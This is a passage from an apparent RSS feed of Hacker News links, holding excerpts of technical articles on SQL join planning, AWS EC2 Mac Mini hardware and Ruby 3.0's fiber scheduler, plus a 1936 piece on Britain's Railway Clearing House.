https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/47730/three-table-join.png 428w,
https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png 578w" sizes="(max-width: 578px) 100vw, 578px" loading="lazy">
  </a>
    </span></p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c <span>join</span> D <span>on</span> c <span>=</span> d<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="four table join" title="four table join" src="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" srcset="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/a48b3/four-table-join.png 214w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/47730/four-table-join.png 428w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png 721w" sizes="(max-width: 721px) 100vw, 721px" loading="lazy">
  </a>
    </span></p>
<p>Let's examine this last example more closely. What happens when we
open an iterator on the root <code>Node</code> of the query? It opens an iterator
on its left child, which in turn opens an iterator on its left child,
and so on. Each node, after accessing a row from its left child, then
attempts to find a matching row from its right child. We end up with
the table access order the same as in the lexical query: <code>A &gt; B &gt; C &gt;
D</code>. </p>
<p>Let's trace through the execution of a single row in the result set.</p>
<ol>
<li>The join node <code>a = b</code> gets a row from <code>A</code>. Then it iterates through
the rows of <code>B</code> looking for rows that match the join condition <code>a =
b</code>. When it finds such a row, it returns it.</li>
<li>The node <code>b = c</code> takes the row from its left child, which is a
concatenation of rows from tables <code>A</code> and <code>B</code>. It then iterates
over its right child, the rows of <code>C</code>, looking for rows that match
the join condition <code>b = c</code>. When it finds such a row, it returns
it.</li>
<li>The node <code>c = d</code> takes the row from its left child, which is a
concatenation of rows from <code>A</code> and <code>B</code> and <code>C</code>, in that order. It
then attempts to match rows from its right child, <code>D</code>, just as
above.</li>
</ol>
<p>Importantly, there are sometimes many possible binary trees that can
implement the above logic to yield a correct result for any given
table access order. The tree construction algorithm above, where we
keep shoving a sub-tree down to the left child of a new join node, is
just what the parser gives us by default because it's left
associative. But we can draw other trees that give the same
results. For example, here's a balanced join tree:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="balanced four table join" title="balanced four table join" src="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png" srcset="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/a48b3/four-table-balanced.png 214w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/47730/four-table-balanced.png 428w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png 856w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png 904w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
  </a>
    </span></p>
<p>Like the original, this produces a table access order of <code>A &gt; B &gt; C &gt;
D</code>. If we wanted to access the tables in the opposite order, we could
simply flip the left and right children of every node in the original
tree like so:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="reversed four table join" title="reversed four table join" src="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" srcset="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/a48b3/four-table-reversed.png 214w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/47730/four-table-reversed.png 428w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png 717w" sizes="(max-width: 717px) 100vw, 717px" loading="lazy">
  </a>
    </span></p>
<p>Again, there are sometimes many possible join trees for a given table
ordering. But they all have one thing in common: their join conditions
refer to tables that can be found in their left and right
children. Otherwise, the node cannot evaluate its join condition. For
example, let's say that we are querying three tables and want to
access them in the order <code>B &gt; A &gt; C</code>. This is an invalid join plan
with that table ordering:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="invalid three table join" title="invalid three table join" src="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" srcset="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/a48b3/three-table-invalid.png 214w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/47730/three-table-invalid.png 428w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png 577w" sizes="(max-width: 577px) 100vw, 577px" loading="lazy">
  </a></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dolthub.com/blog/2020-12-28-join-planning/">https://www.dolthub.com/blog/2020-12-28-join-planning/</a></em></p>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-12-28-join-planning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561173</guid>
            <pubDate>Mon, 28 Dec 2020 17:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How AWS Added Apple Mac Mini Nodes to EC2]]>
            </title>
            <description>
<![CDATA[
Score 193 | Comments 211 (<a href="https://news.ycombinator.com/item?id=25561127">thread link</a>) | @tambourine_man
<br/>
December 28, 2020 | https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg" data-caption="AWS EC2 Apple Mac Mini Node In Rack Cover"><img width="696" height="449" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-400x258.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-651x420.jpg 651w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="AWS EC2 Apple Mac Mini Node In Rack Cover" title="AWS EC2 Apple Mac Mini Node In Rack Cover"></a><figcaption>AWS EC2 Apple Mac Mini Node In Rack Cover</figcaption></figure></div>
            <!-- content --><p>Since this is a holiday week, and we tend to do a bit more fun content. I wanted to take a look at how Amazon AWS is adding Apple Mac Mini nodes to EC2. We recently covered the announcement in <a href="https://www.servethehome.com/amazon-aws-ec2-mac-mini-powered-macos-cloud-instances-launched/">Amazon AWS EC2 Mac Mini Powered MacOS Instances Launched</a>, but now we have some pictures of the solution.<span id="more-49658"></span></p>
<h2>How AWS Added Apple Mac Mini Nodes to EC2</h2>
<p>This is what an x86/ 10GbE Apple Mac Mini looks like in an EC2 rack. One can see that the unit is placed in a sled. Around the Mac Mini are a surprising number of wires being routed through the chassis.</p>
<figure id="attachment_49661" aria-describedby="caption-attachment-49661"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack/" rel="attachment wp-att-49661"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack" width="1253" height="638" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg 1253w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-400x204.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-800x407.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-696x354.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-1068x544.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-825x420.jpg 825w" sizes="(max-width: 1253px) 100vw, 1253px"></a><figcaption id="caption-attachment-49661">AWS EC2 Apple Mac Mini Node In Rack</figcaption></figure>
<p>Many of these wires terminate at the front of the sled. Here, we have an AWS Nitro controller. Amazon is now on its fourth generation of Nitro controller after starting the journey years ago.</p>
<figure id="attachment_49659" aria-describedby="caption-attachment-49659"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-nitro-to-nitro4/" rel="attachment wp-att-49659"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg" alt="AWS Nitro To Nitro4" width="2560" height="688" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg 2560w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-400x107.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-800x215.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1536x413.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-2048x550.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-696x187.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1068x287.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1564x420.jpg 1564w" sizes="(max-width: 2560px) 100vw, 2560px"></a><figcaption id="caption-attachment-49659">AWS Nitro To Nitro4</figcaption></figure>
<p>We have covered this a number of times, but Nitro is effectively what the industry is trying to replicate (and expand upon) as part of the push towards DPUs. If you are not familiar with DPUs, check out our <a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> and video:</p>
<p><iframe title="What is a DPU - A Quick STH Primer to the New Processor" width="696" height="392" src="https://www.youtube.com/embed/S92rdAwIuNk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>On the front of the AWS Mac Mini sled, there is the Nitro controller. There are two <a href="https://www.servethehome.com/exclusive-gigabyte-annapurna-labs-arm-storage-server-benchmarks/">Annapurna Labs</a> branded chips, one with what looks like five DRAM packages atop the PCB and one without. There is a red cable atop the Nitro PCB that almost looks like a standard SATA cable with a 90-degree connector.</p>
<figure id="attachment_49660" aria-describedby="caption-attachment-49660"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack-nitro-controller-highlighted/" rel="attachment wp-att-49660"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted" width="1355" height="609" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg 1355w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-400x180.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-800x360.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-696x313.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-1068x480.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-934x420.jpg 934w" sizes="(max-width: 1355px) 100vw, 1355px"></a><figcaption id="caption-attachment-49660">AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted</figcaption></figure>
<p>AWS says it is using Thunderbolt to connect to the Mac Mini. Although most logos are covered up in AWS’s screenshot, we can see what appears to be (logo partially covered by a white label) a black Belkin Thunderbolt 3 cable on the bottom of the Nitro controller. Amazon said it is using Thunderbolt to connect its Nitro controller to the Mac Mini and provide its basic suite of EBS storage, networking, and security/ management features.</p>
<h2>Final Words</h2>
<p>Something important to keep in mind here is that the Mac Mini itself is a relatively lower cost versus the rest of AWS’s infrastructure to host the node versus many of AWS’s other EC2 offerings. It is also much more complex than something like a <a href="https://www.servethehome.com/myelectronics-nl-apple-mac-mini-and-raspberry-pi-rack-review/">Mac in a Rack</a> setup that we recently featured on STH.</p>
<p><iframe title="Rackmount Apple Mac Mini and Raspberry Pi" width="696" height="392" src="https://www.youtube.com/embed/t__DW0NbJIs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Overall, the big takeaway for our readers should be the impact of the AWS Nitro and why the industry is pushing so hard on DPUs right now. AWS is effectively using its Nitro controller as the endpoint so it can abstract the nodes it is putting on its network. Instead of having to re:Invent (yes that was purposeful) a new Mac OS stack, it could leverage Nitro and deliver its services over Thunderbolt. Some of the Thunderbolt changes in the M1 generation also may partially explain why AWS is using the older x86 nodes instead of newer M1 Arm nodes.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561127</guid>
            <pubDate>Mon, 28 Dec 2020 17:35:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby 3.0 and the new FiberScheduler interface]]>
            </title>
            <description>
<![CDATA[
Score 199 | Comments 77 (<a href="https://news.ycombinator.com/item?id=25560894">thread link</a>) | @WJW
<br/>
December 28, 2020 | http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html | <a href="https://web.archive.org/web/*/http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
            

            <p>
    Posted on December 28, 2020
    
        by wjwh
    
</p>

<p><img src="http://www.wjwh.eu/images/ruby_logo.png" title="Ruby logo"><br>
A few days ago on Christmas day 2020, Matz released Ruby 3.0. Like every year, a host of interesting new features was included with the new version. Most articles I have read so far focus more on the new ways to introduce type hints and the <code>Ractor</code> system but for me the most interesting addition was the introduction of the <code>Fiber::SchedulerInterface</code> class. It allows for (but does not yet implement) more advanced event loop based schedulers for non-blocking I/O in Ruby. Several advanced techniques already exist for this in Ruby, from event loop frameworks like <a href="https://github.com/eventmachine/eventmachine">EventMachine</a> and <a href="https://github.com/socketry/async">Async</a> to releasing the GVL in C extensions, but this new interface is more exciting to me because it makes it much easier to accidentally do the right thing.</p>
<p>In this post I’ll go over the way the scheduler interface works in “normal” Ruby, and how to access it from within MRI C extensions. We’ll also have a look at the drawbacks of the current interface, because nothing is perfect.</p>
<h2 id="nonblocking-io-with-fibers">Nonblocking I/O with Fibers</h2>
<p>In MRI Ruby, a <a href="https://docs.ruby-lang.org/en/master/Fiber.html"><code>Fiber</code></a> is a primitive for implementing light weight cooperative concurrency. They are somewhat like traditional <a href="https://ruby-doc.org/core-3.0.0/Thread.html">threads</a> in that they take a block and run it concurrently with other fibers, but they live with many fibers “inside” a thread. This means that at most one fiber per thread can run at a time, but because they use very little memory it is feasible to create hundreds of thousands of fibers without problems. If you have very computationally intensive tasks for your fibers, this does not bring any benefits since dividing the work into many small parts does not help if you don’t have enough capacity for it in the first place. However, many Ruby processes spend much of their time waiting on I/O, such as waiting for the responses of API and database calls or waiting to read more of a HTTP request from a network socket. This is the use case where fibers shine.</p>
<p>More “traditional” systems manage all this waiting around by allocating a separate operating system (OS) thread for every separate request, then make blocking system calls for reading from and writing to sockets and files. This works well up to a point, but an OS thread is relatively expensive to create and they require a context switch to the OS whenever another thread needs to run. This leads to a lot of overhead. Fibers can leverage the facilities for non-blocking and asynchronous I/O that modern operating systems provide to skip a lot of this overhead. They do this by calling <a href="https://docs.ruby-lang.org/en/master/Fiber.html#method-c-yield"><code>yield</code></a> whenever they realize they will not be able to make progress, giving the floor to another fiber. Some examples might be when <code>Kernel#sleep</code> is called or whenever a <code>read()</code> or <code>write()</code> syscall returns the <a href="https://linux.die.net/man/2/send"><code>EWOULDBLOCK</code> or <code>EAGAIN</code></a> error codes. The missing link in this story is the new fiber scheduler, which is the code that a fiber yields <em>to</em>. The scheduler is responsible for maintaining a inventory of blocked fibers and <code>resume</code>-ing those fibers when the reason why they were blocked disappears. For example, if a fiber was blocked because it called <code>sleep(10)</code>, then after 10 seconds it should be resumed again. If the fiber was blocked because no data was available on the socket it wanted to read from, it should be resumed as soon as data arrives.</p>
<p>The scheduler is allowed to any mechanism to achieve this, but in practice there are a couple of good options:</p>
<ul>
<li>On almost all Linux systems, <code>epoll()</code> is the go-to mechanism for watching large numbers of sockets to see if new data is available. It can also manage sleeps with the <code>timerFD</code> mechanism.</li>
<li>On very modern Linux systems (kernel version 5.4 and beyond), the <code>io_uring</code> API is available. This API makes it not only possible to monitor sockets and manage sleeps, but also to offload the read and write calls themselves to the OS instead of offloading just the waiting for availability.</li>
<li>On Windows systems, IO Completion Ports can be used in much the same way as the <code>io_uring</code> API.</li>
<li>On BSD systems and derivatives like MacOS, the <code>kqueue()</code> system call is used insted of <code>epoll()</code>. I’m not aware of an async I/O API being developed for these systems yet, but would be happy if someone can correct me on that.</li>
</ul>
<p>Choosing between these possible mechanisms and managing the conversion between Ruby objects and what the OS demands is the task of the scheduler. Since fibers are thread-local and cannot move between threads, so is the scheduler. It would theoretically be possible to have an <code>epoll()</code> based scheduler for one thread and an <code>io_uring</code> based one for another, but in practice the scheduler would probably be provided by a separate gem and automatically choose the most performant interface available for the current OS.</p>
<p>To make the integration seamless for Ruby developers, in Ruby 3.0 and onwards all relevant standard library methods have been patched to <code>yield</code> to the scheduler whenever they encounter a situation where they will block the current fiber. These methods include, at the time of writing, <code>Kernel.sleep</code>, <code>IO#wait_readable</code>, <code>IO#wait_writable</code>, <code>IO#read</code>, <code>IO#write</code> and other related methods (e.g.&nbsp;<code>IO#puts</code>, <code>IO#gets</code>), <code>Thread#join</code>, <code>ConditionVariable#wait</code>, <code>Queue#pop</code>, <code>SizedQueue#push</code>. This yielding to the scheduler only happens when a scheduler has actually been defined for the thread with <code>Fiber.set_scheduler</code>. The real power of this becomes apparent when you realize that this means <em>any</em> method in any gem that eventually calls <code>IO#read</code> or <code>IO#write</code> can make use of the scheduler, whether that gem has been written with the scheduler in mind or not. This immediately makes many gems like database drivers and network libraries scheduler-aware, as long as they don’t use C extensions too heavily. Even if they do, not all is lost. We’ll look at integrating C extensions with the scheduler later.</p>
<h2 id="a-non-blocking-io-example">A non-blocking IO example</h2>
<p>Let’s look at a very simple example from the <a href="https://rubyreferences.github.io/rubychanges/3.0.html#non-blocking-fiber-and-scheduler">comprehensive release notes</a>:</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a>start = <span>Time</span>.now</span>
<span id="cb1-2"><a href="#cb1-2"></a></span>
<span id="cb1-3"><a href="#cb1-3"></a><span>Thread</span>.new <span>do</span> <span># in this thread, we'll have non-blocking fibers</span></span>
<span id="cb1-4"><a href="#cb1-4"></a>  <span>Fiber</span>.set_scheduler <span>Scheduler</span>.new</span>
<span id="cb1-5"><a href="#cb1-5"></a></span>
<span id="cb1-6"><a href="#cb1-6"></a><span>  %w[</span><span>2.6 2.7 3.0</span><span>]</span>.each <span>do</span> |version|</span>
<span id="cb1-7"><a href="#cb1-7"></a>    <span>Fiber</span>.schedule <span>do</span> <span># Runs block of code in a separate Fiber</span></span>
<span id="cb1-8"><a href="#cb1-8"></a>      t = <span>Time</span>.now</span>
<span id="cb1-9"><a href="#cb1-9"></a>      <span># Instead of blocking while the response will be ready, the Fiber</span></span>
<span id="cb1-10"><a href="#cb1-10"></a>      <span># will invoke scheduler to add itself to the list of waiting fibers</span></span>
<span id="cb1-11"><a href="#cb1-11"></a>      <span># and transfer control to other fibers</span></span>
<span id="cb1-12"><a href="#cb1-12"></a>      <span>Net</span>::<span>HTTP</span>.get(<span>'rubyreferences.github.io'</span>, <span>"/rubychanges/</span><span>#{</span>version<span>}</span><span>.html"</span>)</span>
<span id="cb1-13"><a href="#cb1-13"></a>      puts <span>'%s: finished in %.3f'</span> % [version, <span>Time</span>.now - t]</span>
<span id="cb1-14"><a href="#cb1-14"></a>    <span>end</span></span>
<span id="cb1-15"><a href="#cb1-15"></a>  <span>end</span></span>
<span id="cb1-16"><a href="#cb1-16"></a><span>end</span>.join <span># At the </span><span>END</span><span> of the thread code, Scheduler will be called to dispatch</span></span>
<span id="cb1-17"><a href="#cb1-17"></a>         <span># all waiting fibers in a non-blocking manner</span></span>
<span id="cb1-18"><a href="#cb1-18"></a></span>
<span id="cb1-19"><a href="#cb1-19"></a>puts <span>'Total: finished in %.3f'</span> % (<span>Time</span>.now - start)</span>
<span id="cb1-20"><a href="#cb1-20"></a><span># Prints:</span></span>
<span id="cb1-21"><a href="#cb1-21"></a><span>#  2.6: finished in 0.139</span></span>
<span id="cb1-22"><a href="#cb1-22"></a><span>#  2.7: finished in 0.141</span></span>
<span id="cb1-23"><a href="#cb1-23"></a><span>#  3.0: finished in 0.143</span></span>
<span id="cb1-24"><a href="#cb1-24"></a><span>#  Total: finished in 0.146</span></span></code></pre></div>
<p>This example sets the scheduler for the new thread to a new instance of some <code>Scheduler</code> class and then uses <code>Fiber.schedule</code> to send off three HTTP requests that fetch the release notes for several recent Ruby versions. We can see in the output that the total time taken is only a few milliseconds longer than the slowest response, indicating that all three HTTP requests were performed in parallel.</p>
<p>How does this work, given that we can see none of the methods mentioned above being used in the example? Well, <code>Net::HTTP.get</code> uses <code>IO#write</code> and <code>IO#read</code> in its implementation, so while a request is in flight and waiting for a response, its fiber will <code>yield</code> back to the scheduler to let other fibers do work. Since the actual CPU work here is very low, many fibers can be run on the same scheduler without them getting in each other’s way too much.</p>
<h2 id="integrating-the-fiber-scheduler-into-c-extensions">Integrating the Fiber scheduler into C extensions</h2>
<p>Having functions like <code>IO#read</code> and <code>Kernel.sleep</code> automatically using the Fiber scheduler is all well and good, but many useful Ruby gems use C extensions to drop the GVL, perform operations “underneath” the Ruby garbage collector or just for plain speed of execution of computationally expensive operations. These C extensions will typically not use the Ruby methods for writing to and reading from file descriptors, so if they wish to use an existing fiber scheduler to efficiently use non-blocking I/O they have to call it themselves. Luckily, this is not hard!</p>
<p>A (very) quick recap of C extensions for MRI: a Ruby object is represented in C by a <code>VALUE</code> struct that contains all the relevant information about the object. A few “standard” values like <code>true</code>, <code>false</code> and <code>nil</code> and some others have been predefined and are available to test against as <code>Qnil</code>, <code>Qtrue</code>, etc. Ruby methods can be called either directly in C (if the Ruby method itself was defined in C) or with the <code>rb_funcall()</code> C function.</p>
<p>Using the scheduler is obviously only possible if it has been defined for the current thread with <code>Fiber#set_scheduler</code>. To check if this is the case in a C extension, we can use the <code>rb_scheduler_current()</code> C function, which will return a <code>VALUE</code> containing either the current scheduler or <code>Qnil</code> if it hasn’t been set. If the scheduler is set, it is possible to call with one of the available functions that are defined in <code>scheduler.c</code> in the main folder of the Ruby repo. Finally as a complete example, let’s look at how the <a href="https://github.com/ruby/ruby/blob/7d0144e055fdbd7110cf84275b9e145550b77fd3/io.c#L1306">Ruby standard library</a> implements this pattern:</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>int</span> rb_io_wait_readable(<span>int</span> f)</span>
<span id="cb2-2"><a href="#cb2-2"></a>{</span>
<span id="cb2-3"><a href="#cb2-3"></a>    VALUE scheduler = rb_scheduler_current();</span>
<span id="cb2-4"><a href="#cb2-4"></a>    <span>if</span> (scheduler != Qnil) {</span>
<span id="cb2-5"><a href="#cb2-5"></a>        <span>return</span> RTEST(</span>
<span id="cb2-6"><a href="#cb2-6"></a>            rb_scheduler_io_wait_readable(scheduler, rb_io_from_fd(f))</span>
<span id="cb2-7"><a href="#cb2-7"></a>        );</span>
<span id="cb2-8"><a href="#cb2-8"></a>    }</span>
<span id="cb2-9"><a href="#cb2-9"></a></span>
<span id="cb2-10"><a href="#cb2-10"></a>    <span>// rest of function for if no scheduler was defined</span></span>
<span id="cb2-11"><a href="#cb2-11"></a>}</span></code></pre></div>
<p>This snippet also demonstrates how to get a Ruby <code>IO</code> object out of a file descriptor: with <code>rb_io_from_fd()</code>.</p>
<h2 id="drawbacks-of-fibers">Drawbacks of Fibers</h2>
<p>The current implementation does still have some drawbacks. For one, fibers are thread-local and cannot be moved between threads (yet). (For the purposes of this paragraph, you can also read “Ractor” wherever I wrote “thread”.) This means that any system that wants to scale beyond a single thread will have to run multiple threads, each with their own …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html">http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html</a></em></p>]]>
            </description>
            <link>http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560894</guid>
            <pubDate>Mon, 28 Dec 2020 17:11:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Railway Clearing House (1936)]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25560849">thread link</a>) | @jpkoning
<br/>
December 28, 2020 | https://www.railwaywondersoftheworld.com/clearing-house.html | <a href="https://web.archive.org/web/*/https://www.railwaywondersoftheworld.com/clearing-house.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="txt_560">
        <p>Checking Rail Transport Revenue</p>
        
        <p><a href="https://www.railwaywondersoftheworld.com/britain.html">RAILWAYS OF BRITAIN -<wbr> 22</a></p>
        
        <p><img alt="Sorting railway tickets in the Railway Clearing House" title="Sorting railway tickets in the Railway Clearing House" src="https://www.railwaywondersoftheworld.com/wpimages/wpf5eb4ce3_05_06.jpg" id="pic_1234"></p>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        <p>SORTING TICKETS in the Railway Clearing House is carried out by a large staff of highly skilled employees. The function of the Railway Clearing House is to clear or to apportion the receipts of the through traffic of Great Britain’s railways and of certain Irish lines and ports. Some 23,000 miles of rail routes come under the scope of the Railway Clearing House system.</p>
        
        
        
        <p>A PROSPECTIVE passenger can walk into any station booking-<wbr>office in Great Britain and purchase a ticket for practically any other station in the country -<wbr> and that ticket will take him right through to his destination, irrespective of the ownership of the lines over which he may have to travel.</p>
        
        <p>The traveller may buy a ticket at Dover, on the Southern Railway, for -<wbr> say, Oban, served by the LMS. How is the ticket money shared?</p>
        
        <p>Again, a train of goods wagons on any line will often bear the initials of all the railway companies -<wbr> GWR, LMS, LNER, SR. How is carriage paid for on the goods in these wagons -<wbr> running as they do over the lines of other companies?</p>
        
        <p>In both instances settlement is made through the <a href="https://en.wikipedia.org/wiki/Railway_Clearing_House">Railway Clearing House</a>. The story of the RCH, as it is usually known, goes back to the very early days of railway operation. At first there was no provision for through booking by passengers. It was not possible to send goods throughout the journey in the same wagon.</p>
        
        <p>The travelling public soon began to demand the convenience of through booking. Merchants, too, dissatisfied with the loss and delay occasioned by transhipping goods from one company’s wagons to those of another, agitated for a system of through-<wbr>invoicing for goods traffic. The railways were forced to give facilities to meet the general demand, but for a time the difficulties of settlement between the various companies were a bar to progress.</p>
        
